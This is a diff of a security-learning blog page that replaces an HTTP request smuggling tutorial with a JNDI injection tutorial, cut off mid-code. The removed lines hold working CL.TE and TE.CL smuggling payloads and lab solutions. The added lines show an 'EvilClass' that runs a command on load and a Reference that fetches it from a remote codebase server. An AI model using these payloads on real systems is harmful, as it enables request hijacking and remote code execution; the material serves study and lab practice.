@@ -4,9 +4,9 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="HTTP 请求走私, marin的小窝">
-    <meta name="description" content="HTTP 请求走私HTTP 请求走私漏洞成因HTTP 请求走私攻击，就是像走私一样在一个 HTTP 请求包中夹带另一个或者多个 HTTP 请求包，常发生于 HTTP/1.1 中
-在现代网络中，用户和应用服务器之间一般不会直接连接，而是通过反">
+    <meta name="keywords" content="SnakeYAML 反序列化, marin的小窝">
+    <meta name="description" content="JNDI 注入JNDI 基础JNDI (java Naming and Directory Interface) 也就是 java 命名和目录接口，当程序定义了 JNDI 中的接口后，就可通过接口 API 访问系统的命名服务和目录服务
+JN">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -18,7 +18,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>HTTP 请求走私 | marin的小窝</title>
+    <title>SnakeYAML 反序列化 | marin的小窝</title>
     <link rel="icon" type="image/jpeg" href="/favicon.jpg">
     
 
@@ -250,12 +250,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/%E9%BB%92%E6%B1%9F%E9%9B%AB%E3%81%9F%E3%82%93_115192288.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/6b5su0brt3bvxzp5za1ixqw5k.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">HTTP 请求走私</h1>
+                    <h1 class="description center-align post-title">SnakeYAML 反序列化</h1>
                 </div>
             </div>
         </div>
@@ -283,8 +283,8 @@
                                 <span class="chip bg-color">web</span>
                             </a>
                         
-                            <a href="/tags/%E6%BC%8F%E6%B4%9E/">
-                                <span class="chip bg-color">漏洞</span>
+                            <a href="/tags/java/">
+                                <span class="chip bg-color">java</span>
                             </a>
                         
                     </div>
@@ -308,7 +308,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2026-01-13
+                    2026-01-16
                 </div>
                 
 
@@ -332,249 +332,367 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="HTTP-请求走私"><a href="#HTTP-请求走私" class="headerlink" title="HTTP 请求走私"></a>HTTP 请求走私</h1><h2 id="HTTP-请求走私-1"><a href="#HTTP-请求走私-1" class="headerlink" title="HTTP 请求走私"></a>HTTP 请求走私</h2><h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>HTTP 请求走私攻击，就是像走私一样在一个 HTTP 请求包中夹带另一个或者多个 HTTP 请求包，常发生于 <code>HTTP/1.1</code> 中</p>
-<p>在现代网络中，用户和应用服务器之间一般不会直接连接，而是通过反向代理进行转发到服务器<br>典型的架构是：用户 –&gt; 前端服务器（Front-end）–&gt; 后端服务器（Back-end）</p>
-<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20251205180903-7tg8uqe.png" alt="image"></p>
-<p>为了提高性能，前后端服务器一般会使用 HTTP Keep-Alive，多个 HTTP 请求复用同一个 TCP 连接依次发送</p>
-<p>漏洞产生点就在这里，如果前后端服务器对一个请求在哪里结束和下一个请求在哪里开始的判断标准不一致，攻击者就可以让前端认为是一个请求，但是后端却认为是两个请求，这里就走私了数据</p>
-<p>‍</p>
-<h3 id="HTTP-请求头"><a href="#HTTP-请求头" class="headerlink" title="HTTP 请求头"></a>HTTP 请求头</h3><p>要利用这个漏洞，就得关注两个请求头</p>
-<h4 id="Content-Length-CL"><a href="#Content-Length-CL" class="headerlink" title="Content-Length (CL)"></a><code>Content-Length (CL)</code></h4><p>这个是直接指定 HTTP 消息体的字节长度，结束条件为读取完指定的字节数</p>
+                <h1 id="JNDI-注入"><a href="#JNDI-注入" class="headerlink" title="JNDI 注入"></a>JNDI 注入</h1><h2 id="JNDI-基础"><a href="#JNDI-基础" class="headerlink" title="JNDI 基础"></a>JNDI 基础</h2><p>JNDI (java Naming and Directory Interface) 也就是 java 命名和目录接口，当程序定义了 JNDI 中的接口后，就可通过接口 API 访问系统的<strong>命名服务</strong>和<strong>目录服务</strong></p>
+<p>JNDI 中可以支持很多种服务：<code>LADP</code>​、<code>RMI</code>​、<code>DNS</code>​、<code>CORBA</code>等等<br>但是 JNDI 不会指定哪一个服务，而是通过 java 的 SPI 机制，这个会根据你的参数自动选择对应的服务并寻找对应的接口</p>
+<table>
+<thead>
+<tr>
+<th>协议</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>LDAP</td>
+<td>轻量级目录访问协议，约定了 Client 和 Server 之间的信息交互格式、使用的端口号、认证方式等内容</td>
+</tr>
+<tr>
+<td>RMI</td>
+<td>Java 远程方法协议，该协议用于远程调用应用程序编程接口，使得客户机上运行的程序可以调用远程服务器上的对象</td>
+</tr>
+<tr>
+<td>DNS</td>
+<td>域名解析服务</td>
+</tr>
+<tr>
+<td>CORBA</td>
+<td>公告对象请求代理体系结构</td>
+</tr>
+</tbody></table>
+<p>这里的命名服务和目录服务与常规的理解有点不一样</p>
+<h3 id="命名服务"><a href="#命名服务" class="headerlink" title="命名服务"></a>命名服务</h3><p>通过名字查找对象</p>
 <ul>
-<li>CL 计算长度需要计算上 <code>\r\n</code> 的两个字节</li>
+<li>DNS：通过域名查找实际的 IP 地址</li>
+<li>文件系统：通过文件名定位到具体的文件</li>
 </ul>
-<h4 id="Transfer-Encoding-TE"><a href="#Transfer-Encoding-TE" class="headerlink" title="Transfer-Encoding (TE)"></a><code>Transfer-Encoding (TE)</code></h4><p>用来指定使用分块编码，这个协议不知道数据的总长度，但是将数据分块传输的，每发一快，就告诉这一块有多大</p>
-<p>什么是分块呢，每一个由 CRLF 也就是 <code>\r\n</code> 截断的就是一块</p>
-<pre class="line-numbers language-none" data-start="1"><code class="language-none">[分块长度的十六进制数] + \r\n
-[这一块的具体内容] + \r\n</code></pre>
-
-<p>结束标识</p>
-<pre class="line-numbers language-none" data-start="1"><code class="language-none">0\r\n
-\r\n</code></pre>
-
+<p>在命名服务中有一些重要的概念</p>
 <ul>
-<li>TE 计算长度并不需要计算最后的 <code>\r\n</code></li>
-<li>按照 rfc 规范，当这个请求头一起出现时，CL 将被忽略</li>
+<li><code>Bindings</code> (绑定)：表示一个名称和对应对象之间的关联关系，又名称和对象组成</li>
+<li><code>Context</code>​ (上下文)：代表命名服务中的一个命名空间，并提供了查找、绑定、解绑等方法处理名称和对象，<code>Context</code> 使得 JNDI 的命名空间可以类似文件系统</li>
+<li><code>References</code> (引用)：表示某个名称对应对象的指针，命名服务利用这个来提供对对象的间接访问，能用工厂等方式重建一个对象，而不是直接返回一个对象</li>
 </ul>
+<h3 id="目录服务"><a href="#目录服务" class="headerlink" title="目录服务"></a>目录服务</h3><p>目录服务是命名服务的拓展，不仅可以将对象映射到名称上，还可以为这些对象提供关联的属性，通过这些属性可以过滤对象</p>
 <p>‍</p>
-<h3 id="请求走私类型"><a href="#请求走私类型" class="headerlink" title="请求走私类型"></a>请求走私类型</h3><p>HTTP 请求走私的类型主要根据前后端对 <code>Content-Length (CL)</code>​ 和 <code>Transfer-Encoding (TE)</code>​ 的优先级的处理差异导致的，一般按照 <code>前端处理方式 . 后端处理方式</code> 来命名</p>
+<h3 id="JNDI-API-和-SPI"><a href="#JNDI-API-和-SPI" class="headerlink" title="JNDI API 和 SPI"></a>JNDI API 和 SPI</h3><p>JNDI 包含两个主要部分：API 和 SPI</p>
+<h4 id="JNDI-API"><a href="#JNDI-API" class="headerlink" title="JNDI API"></a>JNDI API</h4><p>API 是应用编程接口，是 JNDI 提供给 Java 应用的一组标准类和接口，用来执行命名和目录服务</p>
+<p><strong>命名服务</strong></p>
 <ul>
-<li>这里的攻击都可以加上一个 <code>Connection: close</code> 来表示结束了，告诉服务器不需要继续等待了</li>
+<li><code>Context.lookup()</code>：根据名称查找一个对象</li>
+<li><code>Context.bind()</code>：将一个名称绑定到一个对象</li>
+<li><code>Context.rebind()</code>：重新绑定一个名称到一个对象</li>
+<li><code>Context.unbind()</code>：在这个命名空间中解除这个名称和对象的绑定</li>
 </ul>
-<h4 id="CL-TE-攻击"><a href="#CL-TE-攻击" class="headerlink" title="CL.TE 攻击"></a>CL.TE 攻击</h4><p>攻击场景：前端服务器只认 CL，而后端服务器支持并优先使用 TE</p>
-<p>payload 示例<br>（正确的格式这里的 <code>\r\n</code> 是不应该写出来的，因为这里已经有一个换行了，但是为了好看这里还是写上了，后面都一样）</p>
-<pre class="line-numbers language-http" data-language="http" data-start="1"><code class="language-http">POST &#x2F; HTTP&#x2F;1.1
-Host: example.com
-Content-Length: 10
-Transfer-Encoding: chunked
+<pre class="line-numbers language-java" data-language="java" data-start="1"><code class="language-java">&#x2F;&#x2F; 创建 JNDI 上下文
+Context context &#x3D; new InitialContext();
+&#x2F;&#x2F; 用名字查找数据库连接
+DataSource dataSource &#x3D; (DataSource) context.lookup(&quot;jdbc&#x2F;MyDatabase&quot;);
+&#x2F;&#x2F; 获取连接
+Connection connection &#x3D; dataSource.getConnection();</code></pre>
 
-0\r\n
-\r\n
-Marin</code></pre>
-
-<p>在前端来看，这里 <code>Content-Length: 10</code> 刚好 payload 长度是 10，前端就会认为没有问题<br>但是后端用 TE 头来处理的时候，发现了结束的标识，就认为这个请求包已经结束了，多处来的 marin，就会被认为是下一个包的开始</p>
-<p>下一个包就会变成这样，就会导致下一个包的数据 400 或 403</p>
-<pre class="line-numbers language-http" data-language="http" data-start="1"><code class="language-http">marinPOST &#x2F; HTTP&#x2F;1.1
-……</code></pre>
-
-<p>通过这个性质，我们更进一步发送下面的 payload</p>
-<pre class="line-numbers language-http" data-language="http" data-start="1"><code class="language-http">POST &#x2F; HTTP&#x2F;1.1
-Host: example.com
-Content-Length: 32
-Transfer-Encoding: chunked
-
-0\r\n
-\r\n
-GET &#x2F;admin HTTP&#x2F;1.1\r\nFoo: x</code></pre>
-
-<p>这个数据拼接到下一个请求中，最后没有加换行，就将原本的请求完全吃掉了，变成我们期望的请求，这样可以利用受害者的 cookie 完成越权访问，</p>
-<pre class="line-numbers language-http" data-language="http" data-start="1"><code class="language-http">GET &#x2F;admin HTTP&#x2F;1.1
-Foo: xGET &#x2F;home HTTP&#x2F;1.1
-……</code></pre>
-
-<p>‍</p>
-<h4 id="TE-CL-攻击"><a href="#TE-CL-攻击" class="headerlink" title="TE.CL 攻击"></a>TE.CL 攻击</h4><p>攻击场景：前端服务器支持并优先使用 TE，后端只认 CL</p>
-<p>payload 示例</p>
-<pre class="line-numbers language-http" data-language="http" data-start="1"><code class="language-http">POST &#x2F; HTTP&#x2F;1.1
-Host: example.com
-Content-Length: 3
-Transfer-Encoding: chunked
-
-5\r\n
-Marin\r\n
-0\r\n
-\r\n</code></pre>
-
-<p>前端服务器依照 TE 来读取，第一个块字节长度是 5，然后读到结束标识，这个请求没有问题，成功放行到后端<br>后端处理的时候，只读到了 CL 指示的 3 的长度，也就是 <code>5\r\n</code> 后面的数据就被截断了，但是这里比较尴尬的是结束标识也同样被留到下一个请求包中</p>
-<p>所以这里需要构造完整的请求包来让后续执行我们恶意的请求，或者直接就是让请求 400</p>
-<pre class="line-numbers language-http" data-language="http" data-start="1"><code class="language-http">POST &#x2F; HTTP&#x2F;1.1
-Host: example.com
-Content-Length: 4
-Transfer-Encoding: chunked
-
-5c\r\n
-GPOST &#x2F; HTTP&#x2F;1.1\r\n
-Content-Type: application&#x2F;x-www-form-urlencoded\r\n
-Content-Length: 15\r\n
-\r\n
-x&#x3D;1\r\n
-0\r\n
-\r\n</code></pre>
-
-<p>‍</p>
-<h4 id="TE-TE-攻击"><a href="#TE-TE-攻击" class="headerlink" title="TE.TE 攻击"></a>TE.TE 攻击</h4><p>攻击场景：前后端都支持 TE，但是对请求的解析有差异</p>
-<p>核心原理：攻击者发送一个写的有点不规范的 TE 请求头，一个解析容错性强的就认为这个确实是 TE，另一个解析比较严谨的，认为这就不是 TE，我不认可，还是读 CL 吧</p>
-<p>所以这里 payload 的关键其实是处理什么 TE 头能够让一个服务器处理，另一个服务器忽略，然后判断出是哪一个忽略了，走回上两个攻击的形式</p>
-<pre class="line-numbers language-http" data-language="http" data-start="1"><code class="language-http">POST &#x2F; HTTP&#x2F;1.1
-Host: example.com
-Content-Length: 13
-Transfer-Encoding: chunked
-Transfer-Encoding: cow
-
-……</code></pre>
-
+<p><strong>目录服务</strong></p>
 <ul>
-<li><p>双重 Header<br>可能有的服务器优先解析第一个，有的优先解析第二个，第二个非法就忽略了所有 TE 头</p>
-<pre class="line-numbers language-http" data-language="http" data-start="1"><code class="language-http">Transfer-Encoding: chunked
-Transfer-Encoding: cow</code></pre>
-</li>
-<li><p>空格混淆<br>在 TE 头冒号前加一个空格<br>或者是在最开头加一个空格</p>
-<pre class="line-numbers language-http" data-language="http" data-start="1"><code class="language-http">Transfer-Encoding : chunked
- Transfer-Encoding: chunked</code></pre>
-</li>
-<li><p>换行混淆<br>在 TE 头后面加一个换行</p>
-<pre class="line-numbers language-http" data-language="http" data-start="1"><code class="language-http">Transfer-Encoding:
- chunked</code></pre>
-</li>
-<li><p>制表符混淆<br>用制表符代替空格</p>
-<pre class="line-numbers language-http" data-language="http" data-start="1"><code class="language-http">Transfer-Encoding:[tab]chunked</code></pre>
-</li>
-<li><p>内容混淆<br>添加 <code>chunked</code> 关键字时，添加一个字母，看服务器是精准匹配还是模糊匹配</p>
-<pre class="line-numbers language-http" data-language="http" data-start="1"><code class="language-http">Transfer-Encoding: xchunked</code></pre>
-</li>
-<li><p>结构注入<br>这里利用的是 HTTP 处理换行符的不同</p>
-<pre class="line-numbers language-http" data-language="http" data-start="1"><code class="language-http">X: X[\n]Transfer-Encoding: chunked</code></pre>
+<li><code>Context.getAttributes()</code>：获取对象的属性</li>
+<li><code>Context.modifyAttributes()</code>：修改对象的属性</li>
+<li><code>Contest.search()</code>：根据过滤条件搜索对象</li>
+</ul>
+<pre class="line-numbers language-java" data-language="java" data-start="1"><code class="language-java">&#x2F;&#x2F; 创建 JNDI 上下文
+Context context &#x3D; new InitialContext();
+&#x2F;&#x2F; 查找名字
+Attributes atts &#x3D; context.getAttributes(&quot;name&quot;);
+&#x2F;&#x2F; 获取相关属性
+String title &#x3D; (String) attrs.get(&#39;title&#39;).get();
+String department &#x3D; (String) attrs.get(&quot;department&quot;).get();</code></pre>
 
-<p>假设有的服务器认为这个 <code>\n</code>​ 不算换行符，那这里就只是 X 头，但是如果服务器将这个和 <code>\r\n</code> 都视为换行符，那这里就会被识别为</p>
-<pre class="line-numbers language-http" data-language="http" data-start="1"><code class="language-http">X: X
-Transfer-Encoding: chunked</code></pre></li>
+<p>‍</p>
+<h4 id="JNDI-SPI"><a href="#JNDI-SPI" class="headerlink" title="JNDI SPI"></a>JNDI SPI</h4><p>SPI 是服务提供接口，是 JNDI 提供给 java 的一组抽象类和接口，用来开发特定的命名或目录服务</p>
+<ul>
+<li>命名服务提供者接口：需要实现 <code>javax.naming.spi.NamingManager</code> 类和相关接口，提供命名服务的具体实现</li>
+<li>目录服务提供者接口：需要实现 <code>javax.naming.spi.DirContext</code> 及其子类，提供目录操作的实现</li>
+</ul>
+<p>SPI 允许不同的命名和目录服务集成到 JNDI 中，使得 JNDI 能够支持不用的服务，如：DNS、RMI 等<br>同时通过 SPI，能够拓展 JNDI 框架，不需要修改 JNDI API 就能够支持不同的服务</p>
+<p>‍</p>
+<h3 id="JNDI-案例"><a href="#JNDI-案例" class="headerlink" title="JNDI 案例"></a>JNDI 案例</h3><p>实现一个利用 JNDI 接口调用 RMI 的案例</p>
+<p><strong>接口</strong></p>
+<p><code>Remote</code>​ 接口，任何打算让客户端远程调用的接口都需要实现这个接口，并且所有在远程接口中定义的方法都要抛出 <code>java.rmi.RemoteException</code></p>
+<pre class="line-numbers language-java" data-language="java" data-start="1"><code class="language-java">import java.rmi.Remote;
+import java.rmi.RemoteException;
+
+&#x2F;&#x2F; 实现了 Remote 接口
+public interface Hello extends Remote &#123;
+    String sayHello(String input) throws RemoteException;
+&#125;</code></pre>
+
+<p><strong>实现类</strong></p>
+<p><code>UnicastRemoteObject</code> 是 RMI 提供的基础类，只有继承了这个类的对象才是 RMI 远程对象</p>
+<pre class="line-numbers language-java" data-language="java" data-start="1"><code class="language-java">import java.rmi.RemoteException;
+import java.rmi.server.UnicastRemoteObject;
+
+public class HelloImpl extends UnicastRemoteObject implements Hello &#123;
+    protected HelloImpl() throws RemoteException &#123;
+    &#125;
+
+    @Override
+    public String sayHello(String input) throws RemoteException &#123;
+        return input;
+    &#125;
+&#125;</code></pre>
+
+<p><strong>RMI 服务端</strong></p>
+<p>通过命名服务，实现了服务的暴露和发布</p>
+<pre class="line-numbers language-java" data-language="java" data-start="1"><code class="language-java">import java.rmi.RemoteException;
+import java.rmi.registry.LocateRegistry;
+import java.rmi.registry.Registry;
+
+public class RMIServer &#123;
+    public static void main(String[] args) throws RemoteException &#123;
+        &#x2F;&#x2F; 将 Hello 服务转化成 RMI 远程服务接口
+		Hello skeleton &#x3D; new HelloImpl();
+		&#x2F;&#x2F; 将 RMI 服务注册到 1099 端口
+        Registry registry &#x3D; LocateRegistry.createRegistry(1099);
+		&#x2F;&#x2F; 注册 Hello 服务，服务名为 Hello
+        registry.rebind(&quot;Hello&quot;, skeleton);
+    &#125;
+&#125;</code></pre>
+
+<p><strong>JNDI 客户端</strong></p>
+<p><code>Context.INITIAL_CONTEXT_FACTORY</code> 指定了要使用哪个 SPI 实现 API ，这里指定的就是 RMI 服务</p>
+<p><code>Context.PROVIDER_URL</code> 提供了 RMI 注册表的地址</p>
+<pre class="line-numbers language-java" data-language="java" data-start="1"><code class="language-java">import javax.naming.Context;
+import javax.naming.InitialContext;
+import javax.naming.NamingException;
+import java.rmi.RemoteException;
+import java.util.Hashtable;
+
+public class RMIClient &#123;
+    public static void main(String[] args) throws NamingException, RemoteException &#123;
+        &#x2F;&#x2F; 设置 JNDI 环境变量
+		Hashtable&lt;String, String&gt; env &#x3D; new Hashtable&lt;&gt;();
+        env.put(Context.INITIAL_CONTEXT_FACTORY,&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;);
+        env.put(Context.PROVIDER_URL,&quot;rmi:&#x2F;&#x2F;localhost:1099&quot;);
+		&#x2F;&#x2F; 初始化上下文
+        Context ctx &#x3D; new InitialContext(env);
+		&#x2F;&#x2F; 通过命名服务查找远程服务 Hello
+        Hello hello &#x3D; (Hello) ctx.lookup(&quot;Hello&quot;);
+        System.out.println(hello.sayHello(&quot;成功连接到RMI服务，并且实现&quot;));
+    &#125;
+&#125;</code></pre>
+
+<p>最后先打开服务端，再启动客户端，就能实现</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/20251002150938.png" alt="image"></p>
+<p>‍</p>
+<h3 id="JNDI-Reference"><a href="#JNDI-Reference" class="headerlink" title="JNDI Reference"></a>JNDI Reference</h3><p><code>Reference</code> 是一种轻量级的、可序列化的数据结构，不包含一个对象，但是包含了重建一个目标对象需要的全部信息，一般是用来表示不直接存储在命名或目录系统中的对象的引用</p>
+<p><code>Reference</code> 类主要有以下几个构造方法</p>
+<pre class="line-numbers language-java" data-language="java" data-start="1"><code class="language-java">public Reference(String className,String factory,String factoryLocation)
+public Reference(String className)
+public Reference(String className,Vector&lt;RefAddr&gt; addrs,String factory, String factoryLocation)</code></pre>
+
+<blockquote>
+<p><code>className</code> 指定了引用的对象的全限定类名，告诉 JNDI 要加载哪个类</p>
+<p><code>factory</code>​ 指定了用于构建对象的工厂类，这个类必须实现 <code>javax.naming.spi.ObjectFactory</code></p>
+<p><code>addrs</code> 包含了一组引用地址，这些地址包含了重建对象的各种信息</p>
+</blockquote>
+<p>‍</p>
+<h3 id="LDAP-协议"><a href="#LDAP-协议" class="headerlink" title="LDAP 协议"></a>LDAP 协议</h3><p>LDAP 是一种应用层协议，用于访问和维护分布式目录信息服务<br>主要是用来身份验证、信息查询、集中管理用户信息等<br>默认端口是 389</p>
+<ul>
+<li>目录服务：LDAP 的目录服务是按照树形结构存储和组织数据，是设计用来快速读取数据的数据库系统，但不适合频繁写入</li>
+<li>条目( Entry )：是目录服务中的核心数据单元，一个条目由三个部分组成：对象类、属性和一个区别名( DN )，区别名是用来定义这个条目在整个目录树中的确切位置</li>
+<li>对象类：对象类是条目的蓝图或者类型，每个条目必须由一个或多个对象类属性，定义了这个条目必须要包含哪些必须属性和可选属性</li>
+<li>属性：属性是 LDAP 目录中信息的最小单元，以键值对的形式存在</li>
+<li>区别名：DN 是条目的唯一标识符，由一系列用逗号分开的属性&#x2F;值对组成，描述了从当前条目到目录根的完整路径<br>每一个属性&#x2F;值对称为一个相对区别名 ( RDN )</li>
 </ul>
 <p>‍</p>
-<h4 id="CL-CL-攻击"><a href="#CL-CL-攻击" class="headerlink" title="CL.CL 攻击"></a>CL.CL 攻击</h4><p>这个就算不那么常见的了（也很难写成这样</p>
-<p>攻击场景：前后端都支持 CL</p>
-<p>这里利用是传两个 CL 头，RFC 有规定，如果出现两个 CL 头，就要报 400，这里就是测试服务器有没有严格实现</p>
+<h4 id="LDAP-协议操作"><a href="#LDAP-协议操作" class="headerlink" title="LDAP 协议操作"></a>LDAP 协议操作</h4><ol>
+<li>绑定：客户端与 LDAP 服务器建立连接并进行身份验证</li>
+<li>查询：客户端用来查询目录树中符合特定条件的条目</li>
+<li>比较：检查某个条目中的某个属性值是否与给定值匹配</li>
+<li>添加：向目录中添加新的条目</li>
+<li>删除：删除指定的条目</li>
+<li>修改：修改条目的属性值</li>
+<li>修改 DN：修改条目的 DN，从而改变条目在目录树中的位置</li>
+<li>解除绑定：客户端通知 LDAP 服务器结束会话，关闭连接</li>
+</ol>
 <p>‍</p>
-<h4 id="CL-不为-0-的-GET-请求"><a href="#CL-不为-0-的-GET-请求" class="headerlink" title="CL 不为 0 的 GET 请求"></a>CL 不为 0 的 GET 请求</h4><p>这个也是规范问题，就是前端服务器允许了 GET 请求可以带请求体，并且设置了 CL 头，但是后端忽略了 CL 头，导致请求体走私了</p>
+<h3 id="JNDI-结构"><a href="#JNDI-结构" class="headerlink" title="JNDI 结构"></a>JNDI 结构</h3><p><code>javax.naming</code>​：主要用于命名操作，包含命名服务的类和接口，定义了 <code>Context</code>​ 接口和 <code>InitialContext</code> 类</p>
+<p><code>javax.naming.directory</code>​：主要用于目录操作，定义了 <code>DirContext</code>​ 接口和 <code>InitialDirContext</code> 类</p>
+<p><code>javax.naming.event</code>：目录事件通知，让应用监听命名和目录对象的变化</p>
+<p><code>javax.naming.ldap</code>：LDAP 协议专用扩展</p>
+<p><code>javax.naming.spi</code>：SPI 的实现</p>
 <p>‍</p>
-<h2 id="靶场"><a href="#靶场" class="headerlink" title="靶场"></a>靶场</h2><p>这个是 burp 的实验室，这里就尝试打一下</p>
-<p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/request-smuggling">什么是 HTTP 请求走私？教程及示例 | 网络安全学院 — What is HTTP request smuggling? Tutorial &amp; Examples | Web Security Academy</a></p>
-<h3 id="CL-TE-基本漏洞"><a href="#CL-TE-基本漏洞" class="headerlink" title="CL.TE 基本漏洞"></a>CL.TE 基本漏洞</h3><p>几个包翻了一下，可以发现只有主页面的请求是用的 HTTP&#x2F;1.1 协议，虽然返回的是 HTTP&#x2F;2</p>
-<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20251205204343-rq8bzsa.png" alt="image"></p>
-<p>这里也是神秘的（，自己发的时候就会变成 HTTP&#x2F;2 ，需要手动修改</p>
-<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20251205204536-5ir2n29.png" alt="image"></p>
-<p>这里也很简单，这个包发两次就行</p>
-<pre class="line-numbers language-http" data-language="http" data-start="1"><code class="language-http">POST &#x2F; HTTP&#x2F;1.1
-Host: 0ad800c7045fa8a780589e7a001000b9.web-security-academy.net
-Content-Type: application&#x2F;x-www-form-urlencoded
-Content-Length: 6
-Transfer-Encoding: chunked
+<h2 id="JNDI-注入-1"><a href="#JNDI-注入-1" class="headerlink" title="JNDI 注入"></a>JNDI 注入</h2><p>JNDI 注入的前提是能够操作客户端 lookup 方法或其他远程操作方法的参数</p>
+<h3 id="JNDI-RMI"><a href="#JNDI-RMI" class="headerlink" title="JNDI + RMI"></a>JNDI + RMI</h3><p>我们需要在 RMI 服务器上绑定一个 <code>Reference</code> 类</p>
+<p><strong>恶意类</strong></p>
+<p><code>EvilClass</code>​ 就是远程类名，同时也还要作为工厂类名，所以这个类要实现 <code>javax.naming.spi.ObjectFactory</code> 接口</p>
+<pre class="line-numbers language-java" data-language="java" data-start="1"><code class="language-java">import javax.naming.Context;
+import javax.naming.Name;
+import javax.naming.spi.ObjectFactory;
+import java.io.IOException;
+import java.util.Hashtable;
 
-0
+public class EvilClass implements ObjectFactory &#123;
+    static&#123;
+        try&#123;
+            Runtime.getRuntime().exec(&quot;calc&quot;);
+        &#125;catch (IOException e)&#123;
+            throw new RuntimeException(e);
+        &#125;
 
-G</code></pre>
+    &#125;
+    @Override
+    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment) throws Exception &#123;
+        return null;
+    &#125;
+&#125;</code></pre>
 
-<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20251205204642-51opnhq.png" alt="image"></p>
-<p>‍</p>
-<h3 id="TE-CL-基本漏洞"><a href="#TE-CL-基本漏洞" class="headerlink" title="TE.CL 基本漏洞"></a>TE.CL 基本漏洞</h3><p>这个和上面一样，只是要数长度，这里可以使用拓展</p>
-<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20251205205537-ah7n9xi.png" alt="image"></p>
-<p>就能自动转成需要的拓展</p>
-<pre class="line-numbers language-http" data-language="http" data-start="1"><code class="language-http">POST &#x2F; HTTP&#x2F;1.1
-Host: 0aaf00ed03b57ae780d63f6400df000e.web-security-academy.net
-Content-Type: application&#x2F;x-www-form-urlencoded
-Content-Length: 4
-Transfer-Encoding: chunked
+<p><strong>服务端代码</strong></p>
+<pre class="line-numbers language-java" data-language="java" data-start="1"><code class="language-java">Reference reference &#x3D; new Reference(&quot;EvilClass&quot;, &quot;EvilClass&quot;, &quot;http:&#x2F;&#x2F;127.0.0.1:8002&#x2F;&quot;)</code></pre>
 
-5d
-GPOST &#x2F; HTTP&#x2F;1.1
-Content-Type: application&#x2F;x-www-form-urlencoded
-Content-Length: 15
+<p>攻击的核心 payload ，这里接收的是类名和工厂名，最后的地址是工厂类的网络地址，这个服务器上应该包含 <code>EvilClass</code>​ 字节码的 <code>.class</code> 文件</p>
+<pre class="line-numbers language-java" data-language="java" data-start="1"><code class="language-java">ReferenceWrapper referenceWrapper &#x3D; new ReferenceWrapper(reference);</code></pre>
 
-x&#x3D;1
-0
+<p>前面说过，要让 RMI 适配基础类，就需要实现 <code>UnicastRemoteObject</code>​ ，<code>ReferenceWrapper</code>​ 包装后的类就会实现这个，将原本不具备远程能力的 <code>Reference</code> 对象适配成了 RMI 远程对象</p>
+<ul>
+<li>但是 <code>ReferenceWrapper</code> 在后续版本被移除了，需要额外引入 jar 包，这里用的版本是 8u65</li>
+</ul>
+<p>完整代码</p>
+<pre class="line-numbers language-java" data-language="java" data-start="1"><code class="language-java">import com.sun.jndi.rmi.registry.ReferenceWrapper;
+import javax.naming.NamingException;
+import javax.naming.Reference;
+import java.rmi.RemoteException;
+import java.rmi.registry.LocateRegistry;
+import java.rmi.registry.Registry;
 
-</code></pre>
-
-<p>这里有一个关键就是 <code>Content-Length: 15</code>​ 长度，明明这里才 3，为什么需要 15，因为这里是为将下一个请求的请求头给包裹到这个请求的 POST 中 <code>GET / HTTP/1.1</code> 的长度就是 12，刚好被消化掉</p>
-<p>‍</p>
-<h3 id="通过差异响应确认-CL-TE-漏洞"><a href="#通过差异响应确认-CL-TE-漏洞" class="headerlink" title="通过差异响应确认 CL.TE 漏洞"></a>通过差异响应确认 CL.TE 漏洞</h3><pre class="line-numbers language-http" data-language="http" data-start="1"><code class="language-http">POST &#x2F; HTTP&#x2F;1.1
-Host: 0a39004c03757ad680ea496e004a0064.web-security-academy.net
-Cookie: session&#x3D;gRi8G38F8Z3oIpOfB4ueLn9DCPQ8dh9q
-Content-Type: application&#x2F;x-www-form-urlencoded
-Content-Length: 29
-Transfer-Encoding: chunked
-
-0
-
-GET &#x2F;404 HTTP&#x2F;1.1
-Foo:x</code></pre>
-
-<p>‍</p>
-<h4 id="通过差异响应确认-TE-CL-漏洞"><a href="#通过差异响应确认-TE-CL-漏洞" class="headerlink" title="通过差异响应确认 TE.CL 漏洞"></a>通过差异响应确认 TE.CL 漏洞</h4><pre class="line-numbers language-http" data-language="http" data-start="1"><code class="language-http">POST &#x2F; HTTP&#x2F;1.1
-Host: 0aac00a50356381881f025a900950062.web-security-academy.net
-Content-Type: application&#x2F;x-www-form-urlencoded
-Content-length: 4
-Transfer-Encoding: chunked
-
-5e
-POST &#x2F;404 HTTP&#x2F;1.1
-Content-Type: application&#x2F;x-www-form-urlencoded
-Content-Length: 16
-
-x&#x3D;1
-0
-
-</code></pre>
+public class JndiRmiServer &#123;
+    public static void main(String[] args) throws NamingException, RemoteException &#123;
